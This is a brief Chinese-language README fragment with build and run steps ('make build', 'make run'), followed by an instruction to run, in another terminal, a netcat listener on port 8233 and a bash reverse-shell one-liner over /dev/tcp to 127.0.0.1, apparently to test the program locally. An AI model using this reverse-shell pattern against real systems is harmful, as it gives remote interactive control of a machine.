
## 编译

```
make build
```

## 运行

```
make run
```


在另一个终端中执行：

```
nc -l 8233 &
bash -i >& /dev/tcp/127.0.0.1/8233 0>&1 &
```

